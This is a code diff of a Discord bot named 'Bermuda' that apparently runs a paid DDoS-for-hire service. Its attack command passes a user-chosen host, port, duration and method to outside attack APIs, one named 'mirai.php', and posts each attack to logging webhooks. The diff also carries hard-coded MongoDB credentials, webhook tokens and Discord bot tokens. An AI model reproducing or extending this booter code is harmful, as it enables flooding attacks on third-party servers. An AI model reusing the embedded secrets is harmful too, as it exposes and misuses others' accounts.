@@ -19,7 +19,9 @@ from discord import User
 from discord.ext.commands import has_permissions
 import string
 
-client = pymongo.MongoClient("mongodb+srv://MongoDB:4ZXLEIoK1Pahr0ZU@cluster0.isip6.gcp.mongodb.net/buyers?retryWrites=true&w=majority", 27017)
+client = pymongo.MongoClient("mongodb+srv://753159:753159@cluster0.0sz9p.mongodb.net/buyers?retryWrites=true&w=majority", 27017)
+
+
 
 global db
 global PlanA
@@ -30,7 +32,7 @@ global wledA
 global wledB
 global wledC
 global wledReseller
-db = client['db']
+db = client['buyers']
 PlanA = db['planA']
 PlanB = db['planB']
 PlanC = db['planC']
@@ -426,17 +428,17 @@ async def attack(ctx, host, port, secs, method):
 					if method in methodsA:
 						print('higher')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752189710109114398/cMp_D4THKHtd3Jrh18sRTlSOtAALKUGH7FC1ic_vV_bRK5ryjETrqLzREIhxgEMl5_1n',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('http://ejapiservice.xyz/1.php?key=Bermuda-4e567&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					if method in methodslowerA:
 						print('lower')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752189856636993567/OvVSselKbO-vtgBv-OtaRqCdyZQy-xRwnQpP647xVXSEp_3iIWzAc3ZfvjENQNcW_mbd',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('https://illuminatiapi.cc/apis/vipPlus.php?key=ktyjghjmgjkiyu90-&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					if method in othermethods:
 						print('other')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752190104172494951/K81gJPiDnSXRKiMWkUPfSBqfb_N-pR3gq5H-kVTUr1J2ah1jKBZ6VnFh2NiquqfQ-XOB',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('http://51.89.25.74/mirai.php?key=eee&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					sent = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
 					sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
@@ -486,17 +488,17 @@ async def attack(ctx, host, port, secs, method):
 					if method in methodsB:
 						print('higher')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752189710109114398/cMp_D4THKHtd3Jrh18sRTlSOtAALKUGH7FC1ic_vV_bRK5ryjETrqLzREIhxgEMl5_1n',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('http://ejapiservice.xyz/1.php?key=Bermuda-4e567&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					if method in methodslowerB:
 						print('lower')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752189856636993567/OvVSselKbO-vtgBv-OtaRqCdyZQy-xRwnQpP647xVXSEp_3iIWzAc3ZfvjENQNcW_mbd',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('http://ejapiservice.xyz/ejservice.php?key=HovBcDFqet&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					if method in othermethods:
 						print('other')
 						logger = {"content": "```-----------Bermuda Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-						requests.post(url='https://discordapp.com/api/webhooks/752190104172494951/K81gJPiDnSXRKiMWkUPfSBqfb_N-pR3gq5H-kVTUr1J2ah1jKBZ6VnFh2NiquqfQ-XOB',data=logger)
+						requests.post(url='https://discord.com/api/webhooks/780580007751057439/gkkuCK95Qp-RFtIkdUTu1563DZhNEW3_WtoRDH5oM0pt-UucrYFuqQ6d5bcGZGP_YYYa',data=logger)
 						requests.get('http://51.89.25.74/mirai.php?key=eee&host='+host+'&port='+port+'&time='+secs+'&method='+method)
 					sent = discord.Embed(title="Bermuda has sent an attack!", color=0x9700f5)
 					sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
@@ -927,4 +929,4 @@ async def keycheckC(ctx,planakeys):
     	plan.add_field(name="Key", value="▸ Is invalid 🚫", inline=False)
     await ctx.send(embed=plan)    
 
-bot.run('Nzc2NTk3OTc0MTc5NjQzNDMz.X63NOQ.gKnGuIOamfS9KvNGAd8m2NXt3Xo')
+bot.run("Nzc2NTk3OTc0MTc5NjQzNDMz.X63NOQ.KUpe4FG-9iy2535d9htQEA91fb8")
